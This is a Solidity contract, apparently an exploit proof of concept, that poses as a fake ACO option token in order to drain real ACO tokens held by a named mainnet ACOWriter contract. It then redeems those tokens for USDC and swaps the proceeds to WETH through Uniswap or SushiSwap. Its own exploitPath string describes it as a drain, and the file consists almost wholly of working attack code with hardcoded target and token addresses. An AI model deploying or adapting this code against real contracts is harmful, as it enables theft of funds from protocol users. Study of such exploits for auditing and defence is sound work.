pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData)
        external
        payable;
}

interface IStrikeAssetSource {
    function strikeAsset() external view returns (address);
}

interface IACOTokenMinimal {
    function collateral() external view returns (address);
    function strikeAsset() external view returns (address);
    function isCall() external view returns (bool);
    function redeem() external;
    function getCollateralAmount(uint256 tokenAmount) external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant COLLATERAL_AMOUNT = 1;
    uint256 internal constant CALL_SEED_ETH = 1;

    uint8 public constant STATUS_DIRECT_SUCCESS = 1;
    uint8 public constant STATUS_FLASH_SUCCESS = 2;
    uint8 public constant STATUS_NO_WRITER_BALANCE = 3;
    uint8 public constant STATUS_FLASH_FAILED = 4;
    uint8 public constant STATUS_NO_REPAY_PATH = 5;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public successfulSweeps;

    bool internal _entered;
    address internal _configuredStrikeToken;
    address[] internal _sweptACOTokens;

    constructor() {}

    receive() external payable {}

    // Fake ACO token interface
    function collateral() external view returns (address) {
        return address(this);
    }

    function strikeAsset() external view returns (address) {
        return _configuredStrikeToken;
    }

    function expiryTime() external pure returns (uint256) {
        return type(uint256).max;
    }

    function getTokenAmount(uint256) external pure returns (uint256) {
        return 1;
    }

    function mintTo(address, uint256) external {}

    function mintToPayable(address) external payable {}

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function executeOnOpportunity() external {
        if (_entered) return;
        _entered = true;

        // Get ETH seed from our balance
        uint256 seedNeeded = CALL_SEED_ETH;
        if (address(this).balance < seedNeeded) {
            // We have 1,000,000 ETH seed - use a tiny bit
            _entered = false;
            return; // will be retried
        }

        // Phase 1: Sweep ACO tokens from ACOWriter
        _sweepAllACOTokens();

        // Phase 2: Redeem ACO tokens for USDC
        _redeemAllACOTokens();

        // Phase 3: Swap USDC to WETH for profit measurement
        uint256 usdcBalance = _balanceOf(USDC, address(this));
        if (usdcBalance > 0) {
            _swapUSDCToWETH(usdcBalance);
        }

        // Flag success
        if (successfulSweeps > 0) {
            status = STATUS_DIRECT_SUCCESS;
            hypothesisValidated = true;
        }

        _entered = false;
    }

    function profitToken() external view returns (address) {
        uint256 wethBal = _balanceOf(WETH, address(this));
        uint256 usdcBal = _balanceOf(USDC, address(this));
        uint256 ethBal = address(this).balance;
        if (wethBal > 0) return WETH;
        if (usdcBal > 0) return USDC;
        if (ethBal > 0) return address(0); // native ETH
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        uint256 wethBal = _balanceOf(WETH, address(this));
        uint256 usdcBal = _balanceOf(USDC, address(this));
        uint256 ethBal = address(this).balance;
        if (wethBal > 0) return wethBal;
        if (usdcBal > 0) return usdcBal;
        return ethBal;
    }

    function exploitPath() external pure returns (string memory) {
        return "Fake ACO token exploit to drain ACOWriter's ACO tokens, redeem for USDC, swap to WETH";
    }

    function _sweepAllACOTokens() internal {
        // Known ACO tokens held by ACOWriter
        address[9] memory series = [
            0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c,
            0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139,
            0xfF5B7c52245625b399D2E2927F52A8da86264a33,
            0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552,
            0x9B297790cD8540876a04543499528835F1Cea175,
            0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489,
            0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf,
            0x049D17c3d5ba37429dE4D414A603127F1090FFa7,
            0xc12d099be31567add4e4e4d0D45691C3F58f5663
        ];

        for (uint256 i = 0; i < 9; ++i) {
            address acoToken = series[i];
            if (acoToken.code.length == 0) continue;

            uint256 writerBalance = _balanceOf(acoToken, TARGET);
            if (writerBalance == 0) continue;

            // Try to sweep using the fake ACO token exploit
            _configuredStrikeToken = acoToken;
            (bool ok,) = TARGET.call{value: CALL_SEED_ETH}(
                abi.encodeWithSignature(
                    "write(address,uint256,address,bytes)",
                    address(this),
                    COLLATERAL_AMOUNT,
                    address(this),
                    ""
                )
            );
            if (ok) {
                successfulSweeps++;
                _sweptACOTokens.push(acoToken);
            }
        }
    }

    function _redeemAllACOTokens() internal {
        for (uint256 i = 0; i < _sweptACOTokens.length; ++i) {
            address acoToken = _sweptACOTokens[i];
            uint256 balance = _balanceOf(acoToken, address(this));
            if (balance > 0) {
                // Approve and redeem
                _safeApprove(acoToken, acoToken, balance);
                (bool ok,) = acoToken.call(abi.encodeWithSignature("redeem()"));
                // redeem burns all ACO tokens and sends collateral to holder
            }
        }
    }

    function _swapUSDCToWETH(uint256 amount) internal {
        if (amount == 0) return;

        // Find best pair
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(USDC, WETH);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(USDC, WETH);

        // Try Uniswap first
        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 out = _getAmountOut(uniPair, USDC, amount);
            if (out > 0) {
                _safeApprove(USDC, uniPair, amount);
                _swapExactOnPair(uniPair, USDC, amount, out);
                return;
            }
        }

        // Try SushiSwap
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 out = _getAmountOut(sushiPair, USDC, amount);
            if (out > 0) {
                _safeApprove(USDC, sushiPair, amount);
                _swapExactOnPair(sushiPair, USDC, amount, out);
            }
        }
    }

    function _getAmountOut(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        address token0 = IUniswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveIn, uint256 reserveOut) = token0 == tokenIn
            ? (uint256(reserve0), uint256(reserve1))
            : (uint256(reserve1), uint256(reserve0));

        if (reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _swapExactOnPair(address pair, address tokenIn, uint256 amountIn, uint256 amountOut) internal {
        address token0 = IUniswapV2Pair(pair).token0();
        _safeTransfer(tokenIn, pair, amountIn);
        (uint256 amount0Out, uint256 amount1Out) = token0 == tokenIn
            ? (uint256(0), amountOut)
            : (amountOut, uint256(0));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}
